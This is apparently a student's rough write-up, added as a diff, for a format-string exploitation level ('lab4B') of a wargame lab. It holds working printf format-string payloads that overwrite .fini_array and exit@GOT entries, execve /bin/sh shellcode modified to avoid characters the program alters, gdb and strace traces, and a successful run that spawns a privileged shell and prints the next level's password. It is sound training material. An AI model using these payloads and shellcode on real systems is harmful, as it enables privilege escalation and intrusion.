@@ -1,0 +1,253 @@
+Understanding the Code:
+
+
+1. Takes an argument: int main(int argc, char *argv[])
+
+2. Grabs user input up to 100 bytes, places it into buf[100]
+
+3. for loop: count the strlen() of user input, if it ends then exit.
+
+4. (in loop): if buf[i] is within A-Z, xor buf[i] with 32.
+
+5. print out buf
+
+
+Vulnerability: There is no format specifier
+
+printf(buf)
+
+
+
+
+
+./lab4B:     file format elf32-i386
+
+Sections:
+Idx Name          Size      VMA       LMA       File off  Algn
+ 18 .fini_array   00000004  080498ac  080498ac  000008ac  2**2
+                  CONTENTS, ALLOC, LOAD, DATA
+
+
+pwndbg> p system
+$1 = {int (const char *)} 0xf7dfec00 <__libc_system>
+pwndbg> p execve
+$2 = {<text variable, no debug info>} 0xf7e80c60 <execve>
+
+ $(python -c 'print "\xac\x98\x04\x08JUNK\xad\x98\x04\x08JUNK\xae\x98\x04\x08JUNK\xaf\x98\x04\x08" + "%x " * 4 + "%198x%n" + "%236x%n" + "%243x%n" + "%24x%n"') | ./lab4B
+-bash: $'\254\230\004\bJUNK\255\230\004\bJUNK\256\230\004\bJUNK\257\230\004\b%x': command not found
+
+Why doesn't this work??
+$(python -c 'print "\xac\x98\x04\x08/bin\xad\x98\x04\x08n/sh\xae\x98\x04\x08h\x0a\x0a\x0a\xaf\x98\x04\x08" + "%x " * 4 + "%198x%n" + "%236x%n" + "%243x%n" + "%24x%n"') | ./lab4B
+-bash:/bin/sh: No such file or directory
+
+
+
+
+
+Method 2: Overwrite printf/fgets/exit JUMP_SLOT with system()
+Relocation section '.rel.plt' at offset 0x4cc contains 6 entries:
+ Offset     Info    Type            Sym.Value  Sym. Name
+080499ac  00000207 R_386_JUMP_SLOT   00000000   printf
+080499b0  00000307 R_386_JUMP_SLOT   00000000   fgets
+080499b4  00000407 R_386_JUMP_SLOT   00000000   __gmon_start__
+080499b8  00000507 R_386_JUMP_SLOT   00000000   exit
+080499bc  00000607 R_386_JUMP_SLOT   00000000   strlen
+080499c0  00000707 R_386_JUMP_SLOT   00000000   __libc_start_main
+
+
+# r.interactive() doesn't work
+python -c 'from pwn import *; r = process("./lab4B");r.send("\xa\x98\x04\x08JUNK\xad\x98\x04\x08JUNK\xae\x98\x04\x08JUNK\xaf\x98\x04\x08" + "%x " * 4 + "%93x%n" + "%161x%n" + "%181x%n" + "%209x%n"); r.interactive()' | ./lab4B
+
+=============================================================================================
+
+
+OVERWRITE: VMA 080498ac, .fini_array
+
+
+=============================================================================================
+
+$1 = {<text variable, no debug info>} 0xb7e63190 <__libc_system>
+
+lab04box: (shell obtained in gdb but not terminal)
+ r < <(python -c 'print "\xac\x98\x04\x08JUNK\xad\x98\x04\x08JUNK\xae\x98\x04\x08JUNK\xaf\x98\x04\x08" + "%x " * 4 + "%93x%n" + "%161x%n" + "%181x%n" + "%209x%n"')
+
+
+lab4B@warzone:/levels/lab04$ (python -c 'print "\xac\x98\x04\x08JUNK\xad\x98\x04\x08JUNK\xae\x98\x04\x08JUNK\xaf\x98\x04\x08" + "%x " * 4 + "%93x%n" + "%161x%n" + "%181x%n" + "%209x%n"';cat) | strace -f -v -yy -e execve ./lab4B
+execve("./lab4B", ["./lab4B"], ["XDG_SESSION_ID=36", "TERM=screen-256color", "SHELL=/bin/bash", "SSH_CLIENT=192.168.203.1 43372 2"..., "SSH_TTY=/dev/pts/0", "USER=lab4B", "LS_COLORS=rs=0:di=01;34:ln=01;36"..., "ENV=/etc/profile", "MAIL=/var/mail/lab4B", "PATH=/usr/local/sbin:/usr/local/"..., "PWD=/levels/lab04", "LANG=en_US.UTF-8", "PS1=\\[\\033[01;31m\\]\\u\\[\\033[00;3"..., "SHLVL=1", "HOME=/home/lab4B", "LOGNAME=lab4B", "SSH_CONNECTION=192.168.203.1 433"..., "LESSOPEN=| /usr/bin/lesspipe %s", "XDG_RUNTIME_DIR=/run/user/1015", "LESSCLOSE=/usr/bin/lesspipe %s %"..., "OLDPWD=/home/lab4B", "_=/usr/bin/strace"]) = 0
+junjunjun64 b7fcdc20 0 bffff6e4                                                                                      bffff658                                                                                                                                                         6b6e756a                                                                                                                                                                             6b6e756a                                                                                                                                                                                                         6b6e756a
+Process 6764 attached
+[pid  6764] execve("/bin/sh", ["sh", "-c", ""], ["XDG_SESSION_ID=36", "TERM=screen-256color", "SHELL=/bin/bash", "SSH_CLIENT=192.168.203.1 43372 2"..., "SSH_TTY=/dev/pts/0", "USER=lab4B", "LS_COLORS=rs=0:di=01;34:ln=01;36"..., "ENV=/etc/profile", "MAIL=/var/mail/lab4B", "PATH=/usr/local/sbin:/usr/local/"..., "PWD=/levels/lab04", "LANG=en_US.UTF-8", "PS1=\\[\\033[01;31m\\]\\u\\[\\033[00;3"..., "SHLVL=1", "HOME=/home/lab4B", "LOGNAME=lab4B", "SSH_CONNECTION=192.168.203.1 433"..., "LESSOPEN=| /usr/bin/lesspipe %s", "XDG_RUNTIME_DIR=/run/user/1015", "LESSCLOSE=/usr/bin/lesspipe %s %"..., "OLDPWD=/home/lab4B", "_=/usr/bin/strace"]) = 0
+[pid  6764] +++ exited with 0 +++
+--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=6764, si_status=0, si_utime=0, si_stime=0} ---
++++ exited with 0 +++
+id
+==============================================================================================
+
+
+GOT JUMP SLOT overwrite with libc_system():
+
+
+==============================================================================================
+						jmp_slt
+0x08048560  exit@plt	0x80499b8
+0x08048570  strlen@plt	0x80499bc
+0x08048530  printf@plt	0x80499ac
+0x08048540  fgets@plt	0x80499b0
+
+
+overwrite exit@plt.got = 0x80499b8
+
+with system() = 0xb7e63190
+
+lab4B@warzone:/levels/lab04$ (python -c 'print "\xb8\x99\x04\x08JUNK\xb9\x99\x04\x08JUNK\xba\x99\x04\x08JUNK\xbb\x99\x04\x08" + "%x " * 4 + "%93x%n" + "%161x%n" + "%181x%n" + "%209x%n"';cat) | strace -f -v -yy -e execve ./lab4B
+execve("./lab4B", ["./lab4B"], ["XDG_SESSION_ID=37", "TERM=screen-256color", "SHELL=/bin/bash", "SSH_CLIENT=192.168.203.1 34790 2"..., "SSH_TTY=/dev/pts/0", "USER=lab4B", "LS_COLORS=rs=0:di=01;34:ln=01;36"..., "ENV=/etc/profile", "MAIL=/var/mail/lab4B", "PATH=/usr/local/sbin:/usr/local/"..., "PWD=/levels/lab04", "LANG=en_US.UTF-8", "PS1=\\[\\033[01;31m\\]\\u\\[\\033[00;3"..., "SHLVL=1", "HOME=/home/lab4B", "LOGNAME=lab4B", "SSH_CONNECTION=192.168.203.1 347"..., "LESSOPEN=| /usr/bin/lesspipe %s", "XDG_RUNTIME_DIR=/run/user/1015", "LESSCLOSE=/usr/bin/lesspipe %s %"..., "OLDPWD=/home/lab4B", "_=/usr/bin/strace"]) = 0
+junjunjun64 b7fcdc20 0 bffff6e4                                                                                      bffff658                                                                                                                                                         6b6e756a                                                                                                                                                                             6b6e756a                                                                                                                                                                                                         6b6e756a
+Process 15552 attached
+[pid 15552] execve("/bin/sh", ["sh", "-c", "exit 0"], ["XDG_SESSION_ID=37", "TERM=screen-256color", "SHELL=/bin/bash", "SSH_CLIENT=192.168.203.1 34790 2"..., "SSH_TTY=/dev/pts/0", "USER=lab4B", "LS_COLORS=rs=0:di=01;34:ln=01;36"..., "ENV=/etc/profile", "MAIL=/var/mail/lab4B", "PATH=/usr/local/sbin:/usr/local/"..., "PWD=/levels/lab04", "LANG=en_US.UTF-8", "PS1=\\[\\033[01;31m\\]\\u\\[\\033[00;3"..., "SHLVL=1", "HOME=/home/lab4B", "LOGNAME=lab4B", "SSH_CONNECTION=192.168.203.1 347"..., "LESSOPEN=| /usr/bin/lesspipe %s", "XDG_RUNTIME_DIR=/run/user/1015", "LESSCLOSE=/usr/bin/lesspipe %s %"..., "OLDPWD=/home/lab4B", "_=/usr/bin/strace"]) = 0
+[pid 15552] +++ exited with 0 +++
+--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=15552, si_status=0, si_utime=0, si_stime=0} ---
+--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0} ---
++++ killed by SIGSEGV (core dumped) +++
+id
+Segmentation fault (core dumped)
+lab4B@warzone:/levels/lab04$
+=============================================================================================
+
+
+GOT overwrite to Shellcode
+
+
+=============================================================================================
+
+python -c 'print "\xb8\x99\x04\x08JUNK\xb9\x99\x04\x08JUNK\xba\x99\x04\x08JUNK\xbb\x99\x04\x08" + "%x " * 4 + "%93x%n" + "%161x%n" + "%181x%n" + "%209x%n"'
+
+28 bytes + 4 byte nop = 32 bytes
+shellcode = \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
+
+overwrite 
+exit@plt.got
+
+with 
+shellcode = 0xbffff6a4 		*remember to adjust offsets
+
+real shellcode = 0xbffff6x4 (wrong)
+
+#bad chars
+0x41 -> 0x5a
+
+
+gdb-peda$ r < <(python -c 'print "\xb8\x99\x04\x08JUNK\xb9\x99\x04\x08JUNK\xba\x99\x04\x08JUNK\xbb\x99\x04\x08" + "\x90" * 36 + "%x" * 4 + "%81x%n" + "%82x%n" + "%9x%n" + "%192x%n"')
+Starting program: /levels/lab04/lab4B < <(python -c 'print "\xb8\x99\x04\x08JUNK\xb9\x99\x04\x08JUNK\xba\x99\x04\x08JUNK\xbb\x99\x04\x08" + "\x90" * 36 + "%x" * 4 + "%81x%n" + "%82x%n" + "%9x%n" + "%192x%n"')
+junjunjun64b7fcdc200bffff734                                                                         bffff6a8                                                                          6b6e756a 6b6e756a                                                                                                                                                                                        6b6e756a
+0xbffff6a8:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff6b8:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff6c8:     0x78257825      0x78257825      0x78313825      0x38256e25
+
+Breakpoint 2, 0x08048730 in main ()
+gdb-peda$ c
+Continuing.
+0xbffff6a8:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff6b8:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff6c8:     0x78257825      0x78257825      0x78313825      0x38256e25
+
+Breakpoint 3, 0xbffff6a4 in ?? ()
+gdb-peda$ x/32i $pc
+=> 0xbffff6a4:  add    BYTE PTR [eax-0x6f6f6f70],dl
+   0xbffff6aa:  nop
+   0xbffff6ab:  nop
+   0xbffff6ac:  nop
+   0xbffff6ad:  nop
+   0xbffff6ae:  nop
+   0xbffff6af:  nop
+   0xbffff6b0:  nop
+   0xbffff6b1:  nop
+   0xbffff6b2:  nop
+   0xbffff6b3:  nop
+   0xbffff6b4:  nop
+   0xbffff6b5:  nop
+   0xbffff6b6:  nop
+   0xbffff6b7:  nop
+   0xbffff6b8:  nop
+   0xbffff6b9:  nop
+   0xbffff6ba:  nop
+   0xbffff6bb:  nop
+   0xbffff6bc:  nop
+   0xbffff6bd:  nop
+   0xbffff6be:  nop
+   0xbffff6bf:  nop
+   0xbffff6c0:  nop
+   0xbffff6c1:  nop
+   0xbffff6c2:  nop
+   0xbffff6c3:  nop
+   0xbffff6c4:  nop
+   0xbffff6c5:  nop
+   0xbffff6c6:  nop
+   0xbffff6c7:  nop
+   0xbffff6c8:  and    eax,0x25782578
+gdb-peda$ r < <(python -c 'print "\xb8\x99\x04\x08JUNK\xb9\x99\x04\x08JUNK\xba\x99\x04\x08JUNK\xbb\x99\x04\x08" + "\x90" * 36 + "%x" * 4 + "%81x%n" + "%82x%n" + "%9x%n" + "%192x%n"')
+
+0xbffff6a4, should there be "JUNK" here?
+jump over "0xbffff6a4" & try to jump to 0xbffff6aa
+
+
+Shellcode gets ALL kinds of fucked up
+wrote my own, nope
+try to include bad char '\x50', nope to big.
+all '\x50' -> '\x70'
+
+I didn't keep into account that; Any char in A-Z (0x41-0x5a) will be made
+lower case.
+
+50    P
+70    p
+
+          Breaks shellcode
+          p
+          70
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
+
+
+replacement instructions:
+
+	sub esp, 0x4	; prevents clobbering the rest of the stack
+	mov esp, eax	; push eax
+
+nasm > sub esp, 4
+00000000  83EC04            sub esp,byte +0x4
+nasm > mov [esp], eax
+00000000  890424            mov [esp],eax
+
+
+Updated Shellcode:
+
+\x31\xc0\x83\xec\x04\x89\x04\x24\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
+
+GDB SHELL:
+ python -c 'print "\xb8\x99\x04\x08JUNK\xb9\x99\x04\x08JUNK\xba\x99\x04\x08JUNK\xbb\x99\x04\x08" + "\x90" * (36-33) + "\x31\xc0\x83\xec\x04\x89\x04\x24\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "%x" * 4 + "%81x%n" + "%82x%n" + "%9x%n" + "%192x%n"'
+
+find the offest bytes to jump in real shell
+=============================================================================================
+
+LOST OF GUESSES DAMN, flag!
+lab4B@warzone:/levels/lab04$ (python -c 'print "\xb8\x99\x04\x08JUNK\xb9\x99\x04\x08JUNK\xba\x99
+\x04\x08JUNK\xbb\x99\x04\x08" + "\x90" * (36-33) + "\x31\xc0\x83\xec\x04\x89\x04\x24\x68\x2f\x2f
+\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "%x"
+ * 4 + "%257x%n" + "%162x%n" + "%9x%n" + "%192x%n"';cat) | ./lab4B
+junjunjun1$h//shh/bin°
+                      ̀1@̀64b7fcdc200bffff6e4                                                                                                                                                                                                                                                         bffff658                                                                                                                                                          6b6e756a 6b6e756a                                                                                                                                                                                        6b6e756a
+id
+uid=1015(lab4B) gid=1016(lab4B) euid=1016(lab4A) groups=1017(lab4A),1001(gameuser),1016(lab4B)
+cat /home/lab4A/.pass
+fg3ts_d0e5n7_m4k3_y0u_1nv1nc1bl3
+
+
+
+
+
+More efficient ways of obtaining flag:
+
+
+find leaked address pointer,
+
+dev.de
+gdb varies a little bit from the address when directly executing the binary. In order to quickly test a few addresses, I have defined the shellcode address as an argument to the python script.
